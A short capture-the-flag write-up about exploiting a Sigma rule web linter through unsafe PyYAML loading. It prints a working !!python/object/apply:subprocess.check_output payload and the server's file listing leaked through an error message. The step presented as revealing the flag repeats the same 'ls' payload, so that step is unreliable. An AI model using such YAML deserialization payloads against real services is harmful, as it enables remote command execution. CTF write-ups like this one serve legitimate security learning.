sigma being [mostly python](https://github.com/SigmaHQ/pySigma), the web linter might use [pyYaml](https://pyyaml.org/wiki/PyYAMLDocumentation#objects), possibly load the yaml using `load()` instead of  `safe_load()`.

Let's input the rule:

```yaml
title: !!python/object/apply:subprocess.check_output ['ls']
```

this will show the list of files in the current directory in the error message:

```
b'Dockerfile\napp.py\ndocker-compose.yml\nflag.txt\nrequirements.txt\nstatic\ntemplates\n' is not of type 'string'
```

now let's reveal the flag with the rule:

```yaml
title: !!python/object/apply:subprocess.check_output ['ls']
```

the flag will appear in the error message or in a [base64 encoded](https://cyberchef.formality.de/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=Wm14aFozdGlOamt5TVRFMU16QTJZemhsTldNMU5HRXlZemc1TURnek56RmhOR00zTW4wTkNnPT0&oeol=CRLF) format in the formatted sigma rule

research on pyYaml format lead me to nearly the answer: https://medium.com/@zzzmilky/huntressctf-2024-writeups-caa2cfc006c2